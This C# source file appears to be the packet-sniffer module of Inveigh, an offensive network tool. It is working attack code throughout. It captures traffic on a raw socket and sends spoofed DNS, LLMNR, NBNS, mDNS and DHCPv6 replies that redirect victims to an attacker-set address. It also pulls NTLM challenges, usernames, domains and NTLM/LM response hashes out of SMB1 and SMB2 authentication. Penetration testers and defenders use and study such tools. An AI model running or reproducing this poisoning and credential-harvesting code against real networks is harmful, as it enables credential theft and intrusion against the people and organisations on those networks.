using System;
using System.Net;
using System.Net.Sockets;
using System.IO;
using Quiddity.LLMNR;
using Quiddity.Support;
using Quiddity.UDP;
using Quiddity.NetBIOS;
using Quiddity.MDNS;
using Quiddity.DNS;
using Quiddity.SMB;
using Quiddity.TCP;
using Quiddity.IP;
using Quiddity.SMB2;
using Quiddity.NTLM;
using Quiddity.DHCPv6;
using System.Threading;
using System.Text;

namespace Inveigh
{
    class Sniffer
    {
        public static void Start(string protocol, string snifferIP, bool isIPV6)
        {
            byte[] snifferIn = new byte[4] { 1, 0, 0, 0 };
            byte[] snifferOut = new byte[4] { 1, 0, 0, 0 };
            byte[] snifferData = new byte[0];
            byte[] snifferBuffer = new byte[1500];
            Socket snifferSocket;
            IPEndPoint snifferIPEndPoint;
            EndPoint snifferEndPoint;
            AddressFamily addressFamily = AddressFamily.InterNetwork;

            if (isIPV6)
            {
                snifferEndPoint = new IPEndPoint(IPAddress.IPv6Any, 0);
                addressFamily = AddressFamily.InterNetworkV6;
            }
            else
            {
                snifferEndPoint = new IPEndPoint(IPAddress.Any, 0);
            }

            try
            {
                
                if (!isIPV6)
                {
                    snifferSocket = new Socket(addressFamily, SocketType.Raw, ProtocolType.IP);
                    snifferSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);
                }
                else
                {

                    if (String.Equals(protocol, "UDP"))
                    {
                        snifferSocket = new Socket(addressFamily, SocketType.Raw, ProtocolType.Udp);
                    }
                    else
                    {
                        snifferSocket = new Socket(addressFamily, SocketType.Raw, ProtocolType.IP);
                        snifferSocket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.PacketInformation, true);
                    }

                }

                snifferIPEndPoint = new IPEndPoint(IPAddress.Parse(snifferIP), 0);
                snifferSocket.ReceiveBufferSize = 4096;
                snifferSocket.Bind(snifferIPEndPoint);
                snifferSocket.IOControl(IOControlCode.ReceiveAll, snifferIn, snifferOut);
            }
            catch (Exception ex)
            {

                if (ex.Message.Equals("An attempt was made to access a socket in a way forbidden by its access permissions"))
                {
                    Output.Queue(String.Format("[!] Error starting packet sniffer, check if shell has elevated privilege or set -Sniffer N for listener only mode.", Output.Timestamp()));
                    Thread.Sleep(10);
                    Program.isRunning = false;
                }
                else
                {
                    Console.WriteLine(ex.Message);
                }

                throw;
            }         
            
            int packetLength;

            while (Program.isRunning)
            {

                try
                {
                    IPPacketInformation packetInformation = new IPPacketInformation();
                    SocketFlags socketFlags = SocketFlags.None;

                    try
                    {                     
                        packetLength = snifferSocket.ReceiveMessageFrom(snifferBuffer, 0, snifferBuffer.Length, ref socketFlags, ref snifferEndPoint, out packetInformation);
                        snifferData = new byte[packetLength];
                        Buffer.BlockCopy(snifferBuffer, 0, snifferData, 0, packetLength);
                    }
                    catch
                    {
                        packetLength = 0;
                    }

                    if (packetLength > 0)
                    {
                        IPHeader ipHeader = new IPHeader();
                        MemoryStream memoryStream = new MemoryStream(snifferData, 0, packetLength);
                        BinaryReader binaryReader = new BinaryReader(memoryStream);
                        IPAddress sourceIPAddress;
                        int protocolNumber;
                        string sourceIP = "";
                        string destinationIP = "";
                        int ipHeaderLength = 0; // no header for IPv6

                        if (!isIPV6)
                        {                         
                            ipHeader.ReadBytes(snifferData, 0);
                            ipHeaderLength = ipHeader.IHL;
                            byte versionHL = binaryReader.ReadByte();
                            protocolNumber = ipHeader.Protocol;
                            sourceIP = ipHeader.SourceAddress.ToString();
                            destinationIP = ipHeader.DestinationAddress.ToString();
                        }
                        else
                        {
                            sourceIPAddress = (snifferEndPoint as IPEndPoint).Address;
                            sourceIP = sourceIPAddress.ToString();
                            destinationIP = packetInformation.Address.ToString();

                            if (String.Equals(protocol, "UDP"))
                            {
                                protocolNumber = 17;
                            }
                            else
                            {
                                protocolNumber = 6; // this doesn't keep UDP traffic out of TCP section
                            }

                        }                     

                        switch (protocolNumber)
                        {
                            case 6:
                                TCPHeader tcpHeader = new TCPHeader();
                                bool isTCP = true; // IPv6 workaround

                                try
                                {
                                    tcpHeader.ReadBytes(snifferData, ipHeaderLength);

                                    if (tcpHeader.SYN && !tcpHeader.ACK && snifferIP.Equals(destinationIP))
                                    {
                                        Output.Queue(String.Format("[.] [{0}] TCP({1}) SYN packet from {2}:{3}", Output.Timestamp(), tcpHeader.DestinationPort, sourceIP, tcpHeader.SourcePort));
                                    }

                                }
                                catch
                                {
                                    isTCP = false;
                                }

                                string tcpDestinationPort = tcpHeader.DestinationPort.ToString();
                                string tcpSourcePort = tcpHeader.SourcePort.ToString();

                                if (tcpHeader.DataOffset >= 20 && isTCP)
                                {
                                    byte[] tcpPayload = new byte[0];

                                    try
                                    {
                                        tcpPayload = new byte[packetLength - tcpHeader.DataOffset - ipHeaderLength];
                                    }
                                    catch
                                    {
                                        isTCP = false;
                                    }

                                    if (tcpPayload.Length > 0 && isTCP)
                                    {

                                        Buffer.BlockCopy(snifferData, ipHeaderLength + tcpHeader.DataOffset, tcpPayload, 0, tcpPayload.Length);

                                        switch (tcpHeader.DestinationPort)
                                        {
                                            case 139:
                                                ProcessSMB(tcpPayload, sourceIP, destinationIP, tcpSourcePort, tcpDestinationPort);
                                                break;

                                            case 445:
                                                ProcessSMB(tcpPayload, sourceIP, destinationIP, tcpSourcePort, tcpDestinationPort);
                                                break;
                                        }

                                        switch (tcpHeader.SourcePort)
                                        {
                                            case 139:
                                                ProcessSMB(tcpPayload, sourceIP, destinationIP, tcpSourcePort, tcpDestinationPort);
                                                break;

                                            case 445:
                                                ProcessSMB(tcpPayload, sourceIP, destinationIP, tcpSourcePort, tcpDestinationPort);
                                                break;
                                        }

                                    }
                                }

                                break;

                            case 17:
                                UDPHeader udpHeader = new UDPHeader(snifferData, ipHeaderLength);
                                byte[] udpPayload = new byte[udpHeader.Length - 8];
                                Buffer.BlockCopy(snifferData, ipHeaderLength + 8, udpPayload, 0, udpPayload.Length);

                                switch (udpHeader.DestinationPort)
                                {

                                    case 53:
                                        {

                                            if (snifferIP.StartsWith(destinationIP))
                                            {
                                                ProcessDNSRequest(udpPayload, sourceIP, udpHeader.SourcePort, snifferIP, 53);
                                            }

                                        }
                                        break;

                                    case 137:
                                        {

                                            if (!isIPV6)
                                            {
                                                ProcessNBNSRequest(udpPayload, sourceIP, udpHeader.SourcePort, snifferIP, 5355);
                                            }

                                        }
                                        break;

                                    case 547:
                                        {

                                            if (isIPV6)
                                            {
                                                ProcessDHCPv6Request(udpPayload, sourceIP, udpHeader.SourcePort, snifferIP, 547);
                                            }

                                        }
                                        break;

                                    case 5353:
                                        {
                                            ProcessMDNSRequest(udpPayload, sourceIP, udpHeader.SourcePort, snifferIP, 5353);
                                        }
                                        break;

                                    case 5355:
                                        {
                                            ProcessLLMNRRequest(udpPayload, sourceIP, udpHeader.SourcePort, snifferIP, 5355);
                                        }
                                        break;

                                }
                                break;
                        }

                    }

                }
                catch (Exception ex)
                {
                    Output.Queue(String.Format("[-] [{0}] Packet sniffing error detected - {1}", Output.Timestamp(), ex.ToString()));
                }

            }

        }

        internal static void ProcessDNSRequest(byte[] data, string clientIP, int clientPort, string sourceIP, int sourcePort)
        {

            DNSPacket packet = new DNSPacket(data)
            {
                Host = Program.argDNSHost,
                TTL = uint.Parse(Program.argDNSTTL)
            };

            DNSListener listener = new DNSListener(UInt32.Parse(Program.argDNSTTL));

            if (packet.Header.IsQuery())
            {

                if (listener.Check(packet.Question.Name, packet.Question.Type, clientIP, out string message))
                {
                    byte[] buffer = packet.GetBytes(UInt32.Parse(Program.argDNSTTL), Program.dnsSerial, Program.argSpooferIP, Program.argSpooferIPv6);

                    if (!Utilities.ArrayIsNullOrEmpty(buffer))
                    {
                        UDPSocket.SendTo(clientIP, clientPort, sourceIP, sourcePort, buffer, false);
                    }

                }

                Output.SpooferOutput("DNS", packet.Question.Type, packet.Question.Name, clientIP, message);
            }

        }

        internal static void ProcessLLMNRRequest(byte[] data, string clientIP, int clientPort, string sourceIP, int sourcePort)
        {
            LLMNRPacket packet = new LLMNRPacket(data);
            LLMNRListener listener = new LLMNRListener();

            if (packet.Header.IsQuery())
            {

                if (listener.Check(packet.Question.Name, packet.Question.Type, clientIP, out string message))
                {
                    byte[] buffer = packet.GetBytes(UInt32.Parse(Program.argLLMNRTTL), Program.argSpooferIP, Program.argSpooferIPv6);

                    if (!Utilities.ArrayIsNullOrEmpty(buffer))
                    {
                        UDPSocket.SendTo(clientIP, clientPort, sourceIP, sourcePort, buffer, false);
                    }

                }

                Output.SpooferOutput("LLMNR", packet.Question.Type, packet.Question.Name, clientIP, message);
            }

        }

        internal static void ProcessNBNSRequest(byte[] data, string clientIP, int clientPort, string sourceIP, int sourcePort)
        {
            NetBIOSNSPacket packet = new NetBIOSNSPacket(data);
            NBNSListener listener = new NBNSListener();

            if (packet.Header.IsQuery())
            {

                if (listener.Check(packet.Question.Name, packet.Question.Type, clientIP, out string message))
                {
                    byte[] buffer = packet.GetBytes(UInt32.Parse(Program.argNBNSTTL), Program.argSpooferIP);

                    if (!Utilities.ArrayIsNullOrEmpty(buffer))
                    {
                        UDPSocket.SendTo(clientIP, clientPort, sourceIP, sourcePort, buffer, false);
                    }

                }

                Output.SpooferOutput("NBNS", packet.Question.Type, packet.Question.Name, clientIP, message);
            }

        }

        internal static void ProcessMDNSRequest(byte[] data, string clientIP, int clientPort, string sourceIP, int sourcePort)
        {
            MDNSPacket packet = new MDNSPacket(data);
            MDNSListener listener = new MDNSListener();
            string destinationIP = clientIP;

            if (packet.Header.IsQuery())
            {

                if (listener.Check(packet.Question.Name, packet.Question.QuestionType, packet.Question.Type, clientIP, out string message))
                {

                    if (packet.Question.QuestionType.Equals("QM") && !Program.enabledMDNSUnicast && string.Equals(IPAddress.Parse(clientIP).AddressFamily.ToString(), "InterNetwork"))
                    {
                        destinationIP = "224.0.0.251";
                    }
                    else if (packet.Question.QuestionType.Equals("QM") && !Program.enabledMDNSUnicast && string.Equals(IPAddress.Parse(clientIP).AddressFamily.ToString(), "InterNetworkV6"))
                    {
                        destinationIP = "ff02::fb";
                    }

                    byte[] buffer = packet.GetBytes(uint.Parse(Program.argMDNSTTL), Program.argSpooferIP, Program.argSpooferIPv6);

                    if (!Utilities.ArrayIsNullOrEmpty(buffer))
                    {
                        UDPSocket.SendTo(destinationIP, clientPort, sourceIP, sourcePort, buffer, false);
                    }

                }

                string type = string.Concat(packet.Question.QuestionType, ")(", packet.Question.Type);
                Output.SpooferOutput("mDNS", type, packet.Question.Name, clientIP, message);
            }

        }

        internal static void ProcessDHCPv6Request(byte[] data, string clientIP, int clientPort, string sourceIP, int sourcePort)
        {
            DHCPv6Packet packet = new DHCPv6Packet(data);
            DHCPv6Listener listener = new DHCPv6Listener();

            if (packet.Message?.MsgType == 1 || packet.Message?.MsgType == 3 || packet.Message?.MsgType == 5)
            {
                bool isMicrosoft = false;

                if (packet.Option16?.EnterpriseNumber == 311)
                {
                    isMicrosoft = true;
                }

                byte msgType = 0;
                string leaseIP = "";

                switch (packet.Message.MsgType)
                {

                    case 1:
                        msgType = 2;
                        break;

                    case 3:
                        {                 
                            byte[] renewIP = new DHCPv6Option5(packet.Option3.IANAOptions).IPv6Address;
                            leaseIP = new IPAddress(renewIP).ToString();
                            msgType = 7;
                        }
                        break;

                    case 5:
                        {
                            byte[] renewIP = new DHCPv6Option5(packet.Option3.IANAOptions).IPv6Address;
                            leaseIP = new IPAddress(renewIP).ToString();
                            msgType = 7;
                        }
                        break;
                }

                byte[] clientMACData = new DHCPv6DUIDLLT(packet.Option1.DUID).LinkLayerAddress;
                string clientMAC = BitConverter.ToString(clientMACData).Replace("-", ":");
                string clientHostName = "";

                if (!String.IsNullOrEmpty(packet.Option39?.DomainName))
                {
                    clientHostName = packet.Option39.DomainName;
                }

                if (listener.Check(clientMAC, clientHostName, Program.argMAC, isMicrosoft, out string message))
                {

                    if (msgType == 2)
                    {
                        leaseIP = "fe80::" + Program.dhcpv6Random + ":" + Program.dhcpv6IPIndex;
                        Program.dhcpv6IPIndex++;
                    }

                    byte[] buffer = new DHCPv6Packet().GetBytes(msgType, leaseIP, Program.argMAC, Program.argSpooferIPv6, Program.argDNSSuffix, uint.Parse(Program.argDHCPv6TTL), packet);
                    
                    if (!Utilities.ArrayIsNullOrEmpty(buffer))
                    {
                        UDPSocket.SendTo(clientIP, clientPort, sourceIP, sourcePort, buffer, false);
                    }
                }

                Output.DHCPv6Output(packet.Message.MsgType, leaseIP, clientIP, clientMAC, clientHostName, message);
            }

        }

        internal static void ProcessSMB(byte[] data, string clientIP, string listenerIP, string clientPort, string listenerPort)
        {

            if (data.Length >= 4)
            {
                NetBIOSSessionService requestNetBIOSSessionService = new NetBIOSSessionService(data);
                SMBHeader smbHeader = new SMBHeader();
                SMB2Header smb2Header = new SMB2Header();
                int sessionServiceIndex = 0;

                if (requestNetBIOSSessionService.Type == 0)
                {
                    sessionServiceIndex = 4;
                }

                SMBHelper helper = new SMBHelper(data, sessionServiceIndex);
                string session;
                string challenge;

                if (helper.Protocol[0] == 0xff)
                {
                    smbHeader.ReadBytes(data, sessionServiceIndex);
                    string flags = Convert.ToString(smbHeader.Flags, 2).PadLeft(8, '0');

                    switch (smbHeader.Command)
                    {
                        case 0x72:
                            {
                                
                                if (String.Equals(flags.Substring(0, 1), "0"))
                                {
                                    Output.Queue(String.Format("[.] [{0}] SMB1({1}) negotiation request detected from {2}:{3}", Output.Timestamp(), listenerPort, clientIP, clientPort));
                                }

                            }

                            break;

                        case 0x73:
                            {
                                
                                if (String.Equals(flags.Substring(0, 1), "1"))
                                {
                                    SMBCOMSessionSetupAndXResponse smbCOMSessionSetupAndXResponse = new SMBCOMSessionSetupAndXResponse(data, 32 + sessionServiceIndex);

                                    if (smbCOMSessionSetupAndXResponse.SecurityBlobLength > 0)
                                    {

                                        if (!BitConverter.ToString(smbCOMSessionSetupAndXResponse.SecurityBlob).Contains("2A-86-48-86-F7-12-01-02-02")) // kerberos
                                        {
                                            NTLMHelper ntlmHelper = new NTLMHelper(smbCOMSessionSetupAndXResponse.SecurityBlob);

                                            if (ntlmHelper.Signature.StartsWith("NTLMSSP"))
                                            {

                                                if (ntlmHelper.MessageType == 2)
                                                {
                                                    NTLMChallenge ntlmChallenge = new NTLMChallenge(smbCOMSessionSetupAndXResponse.SecurityBlob);
                                                    session = String.Concat(listenerIP, ":", listenerPort);
                                                    challenge = BitConverter.ToString(ntlmChallenge.ServerChallenge).Replace("-", "");
                                                    Program.smbSessionTable[session] = challenge;
                                                    Output.Queue(string.Format("[+] [{0}] SMB({1}) NTLM challenge [{2}] sent to {3}:{4}", Output.Timestamp(), clientPort, challenge, clientIP, listenerPort));
                                                }

                                            }

                                        }
                                        else
                                        {
                                            Output.Queue(string.Format("[.] [{0}] SMB({1}) Kerberos authentication from {2}:{3}", Output.Timestamp(), clientPort, clientIP, listenerPort));
                                        }

                                    }

                                }
                                else
                                {
                                    SMBCOMSessionSetupAndXRequest smbCOMSessionSetupAndXRequest = new SMBCOMSessionSetupAndXRequest(data, 32 + sessionServiceIndex);

                                    if (smbCOMSessionSetupAndXRequest.SecurityBlobLength > 0)
                                    {

                                        if (!BitConverter.ToString(smbCOMSessionSetupAndXRequest.SecurityBlob).Contains("2A-86-48-86-F7-12-01-02-02")) // kerberos
                                        {
                                            NTLMHelper ntlmHelper = new NTLMHelper(smbCOMSessionSetupAndXRequest.SecurityBlob);

                                            if (ntlmHelper.Signature.StartsWith("NTLMSSP"))
                                            {

                                                if (ntlmHelper.MessageType == 3)
                                                {
                                                    NTLMResponse ntlmResponse = new NTLMResponse(smbCOMSessionSetupAndXRequest.SecurityBlob);
                                                    session = String.Concat(clientIP, ":", clientPort);
                                                    challenge = Program.smbSessionTable[session]?.ToString();
                                                    string domain = Encoding.Unicode.GetString(ntlmResponse.DomainName);
                                                    string user = Encoding.Unicode.GetString(ntlmResponse.UserName);
                                                    string host = Encoding.Unicode.GetString(ntlmResponse.Workstation);
                                                    string response = BitConverter.ToString(ntlmResponse.NtChallengeResponse).Replace("-", "");
                                                    string lmResponse = BitConverter.ToString(ntlmResponse.LmChallengeResponse).Replace("-", "");
                                                    Output.NTLMOutput(user, domain, challenge, response, clientIP, host, "SMB", listenerPort, clientPort, lmResponse);
                                                }

                                            }

                                        }

                                    }

                                }

                            }
                            break;

                    }

                }
                else if (helper.Protocol[0] == 0xfe)
                {
                    smb2Header.ReadBytes(data, sessionServiceIndex);
                    string flags = Convert.ToString(BitConverter.ToUInt16(smb2Header.Flags, 0), 2).PadLeft(smb2Header.Flags.Length * 8, '0');

                    switch (smb2Header.Command)
                    {

                        case 0:
                            {
                                
                                if (String.Equals(flags.Substring(31, 1), "0"))
                                {
                                    Output.Queue(String.Format("[.] [{0}] SMB2+({1}) negotiation request detected from {2}:{3}", Output.Timestamp(), listenerPort, clientIP, clientPort));
                                }

                            }
                        break;

                        case 1:
                            {
                            
                                if (String.Equals(flags.Substring(31, 1), "1"))
                                {
                                    SMB2SessionSetupResponse smb2SessionSetupResponse = new SMB2SessionSetupResponse(data, 64 + sessionServiceIndex);

                                    if (smb2SessionSetupResponse.SecurityBufferLength > 0)
                                    {

                                        if (!BitConverter.ToString(smb2SessionSetupResponse.Buffer).Contains("2A-86-48-86-F7-12-01-02-02")) // kerberos
                                        {
                                            NTLMHelper ntlmHelper = new NTLMHelper(smb2SessionSetupResponse.Buffer);

                                            if (ntlmHelper.Signature.StartsWith("NTLMSSP"))
                                            {

                                                if (ntlmHelper.MessageType == 2)
                                                {
                                                    NTLMChallenge ntlmChallenge = new NTLMChallenge(smb2SessionSetupResponse.Buffer);
                                                    session = BitConverter.ToString(smb2Header.SessionId).Replace("-", "");
                                                    challenge = BitConverter.ToString(ntlmChallenge.ServerChallenge).Replace("-", "");
                                                    Program.smbSessionTable[session] = challenge;
                                                    Output.Queue(String.Format("[+] [{0}] SMB({1}) NTLM challenge [{2}] sent to {3}:{4}", Output.Timestamp(), clientPort, challenge, clientIP, listenerPort));
                                                }

                                            }

                                        }
                                        else
                                        {
                                            Output.Queue(string.Format("[.] [{0}] SMB({1}) Kerberos authentication from {2}:{3}", Output.Timestamp(), clientPort, clientIP, listenerPort));
                                        }

                                    }
                                }
                                else
                                {
                                    SMB2SessionSetupRequest smb2SessionSetupRequest = new SMB2SessionSetupRequest(data, 64 + sessionServiceIndex);

                                    if (smb2SessionSetupRequest.SecurityBufferLength > 0)
                                    {

                                        if (!BitConverter.ToString(smb2SessionSetupRequest.Buffer).Contains("2A-86-48-86-F7-12-01-02-02")) // kerberos
                                        {
                                            NTLMHelper ntlmHelper = new NTLMHelper(smb2SessionSetupRequest.Buffer);

                                            if (ntlmHelper.Signature.StartsWith("NTLMSSP"))
                                            {

                                                if (ntlmHelper.MessageType == 3)
                                                {
                                                    NTLMResponse ntlmResponse = new NTLMResponse(smb2SessionSetupRequest.Buffer);
                                                    session = BitConverter.ToString(smb2Header.SessionId).Replace("-", "");
                                                    challenge = Program.smbSessionTable[session]?.ToString();
                                                    string domain = Encoding.Unicode.GetString(ntlmResponse.DomainName);
                                                    string user = Encoding.Unicode.GetString(ntlmResponse.UserName);
                                                    string host = Encoding.Unicode.GetString(ntlmResponse.Workstation);
                                                    string response = BitConverter.ToString(ntlmResponse.NtChallengeResponse).Replace("-", "");
                                                    string lmResponse = BitConverter.ToString(ntlmResponse.LmChallengeResponse).Replace("-", "");
                                                    Output.NTLMOutput(user, domain, challenge, response, clientIP, host, "SMB", listenerPort, clientPort, lmResponse);
                                                }

                                            }

                                        }

                                    }

                                }
                            }
                        break;
                    }

                }

            }

        }

    }

}
